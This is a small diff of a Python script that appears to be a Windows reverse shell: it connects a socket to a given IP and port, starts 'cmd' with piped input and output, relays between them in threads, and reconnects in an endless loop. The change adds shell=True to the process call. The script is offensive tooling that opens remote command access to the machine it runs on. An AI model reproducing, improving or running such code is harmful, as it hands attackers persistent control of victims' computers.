@@ -48,7 +48,7 @@ def main():
 
     s.connect((ip,port)) # Fix
 
-    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE , shell=True)
 
     s2p_thread = threading.Thread(target=s2p, args=[s, p])
     s2p_thread.daemon = True
@@ -64,5 +64,5 @@ def main():
         s.close()
 
 while True:
-    main()
+    main() 
 # main()
